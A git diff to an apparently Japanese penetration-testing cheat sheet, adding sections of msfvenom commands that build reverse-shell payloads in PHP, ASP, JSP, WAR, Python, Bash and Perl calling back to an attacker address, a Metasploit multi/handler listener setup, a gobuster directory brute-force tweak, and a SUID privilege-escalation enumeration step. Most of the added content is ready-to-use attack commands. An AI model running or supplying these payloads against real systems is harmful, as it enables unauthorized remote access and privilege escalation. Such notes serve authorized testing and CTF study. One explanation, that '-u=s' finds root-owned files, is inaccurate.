@@ -32,6 +32,14 @@ Twitter:@yukitsukai1731
       - [Windows(meterpreter)](#Windows(meterpreter))
       - [Windows(netcatなど)](#Windows(netcatなど))
       - [Linux](#Linux)
+      - [PHP(msfvenom)](#PHP(msfvenom))
+      - [ASP(msfvenom)](#ASP(msfvenom))
+      - [JSP(msfvenom)](#JSP(msfvenom))
+      - [WAR(msfvenom)](#WAR(msfvenom))
+      - [Python(msfvenom)](#Python(msfvenom))
+      - [Bash(msfvenom)](#Bash(msfvenom))
+      - [Perl(msfvenom)](#Perl(msfvenom))
+      - [Handlers](#Handlers)
   - [Webアプリケーション](#Webアプリケーション)
       - [LFI](#lfi)
       - [XSS](#xss)
@@ -44,6 +52,7 @@ Twitter:@yukitsukai1731
     - [evilwinrm](#evilwinrm)
   - [Linux](#linux)
     - [linux-exploit-suggester](#linux-exploit-suggester)
+    - [SUID](#SUID)
   - [HTTP/HTTPS Servers](#httpserver)
   - [Wordlist](#wordlist)
   - [Default Passwords](#default-passwords)
@@ -109,15 +118,15 @@ ls | grep smb
 隠されたディレクトリや公開範囲が間違えて設定されているものはないかを調べるために使用。
 
 ```
-gobuster dir -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
+gobuster dir -t 100 -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
 ```
 
 - dir...ディレクトリ総当たり
+- -t...スレッド数
 - -u...URL指定
 - -w...wordlistの指定
 - -o...ファイル出力
 - -x...拡張子指定
-
 
 ## Nikto
 Webサーバスキャナー。  
@@ -250,7 +259,50 @@ msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > rever
 
 #### Linux
 ```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o <outout_name>.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
+```
+
+#### PHP(msfvenom)
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
+```
+
+#### ASP(msfvenom)
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
+```
+
+#### JSP(msfvenom)
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
+```
+
+#### WAR(msfvenom)
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
+```
+
+#### Python(msfvenom)
+```
+msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
+```
+#### Bash(msfvenom) 
+```
+msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
+```
+#### Perl(msfvenom)
+```
+msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
+```
+
+#### Handlers
+```
+use exploit/multi/handler
+set payload <payload>
+set LHOST <ip address>
+set LPORT <port number>
+run
 ```
 
 ## Webアプリケーション
@@ -351,6 +403,25 @@ linuxで特権昇格の脆弱性を列挙するためのスクリプト
 ```
 ./linux-exploit-suggester.pl
 ```
+
+### SUID
+Linuxでは、SUIDビットが有効になっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
+まずはSUIDファイルを見つける。
+下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+- /は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索
+- -permは、後続の権限の検索
+- -u=sは、rootユーザーが所有するファイルを検索
+- -typeは、探しているファイルの種類を示します
+- fは、ディレクトリや特殊ファイルではなく、通常のファイルを示す
+- 2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す
+- &gt;はリダイレクトを意味する
+- /dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト
+
 
 # httpserver
 攻撃者マシンでのサーバ立ち上げ。
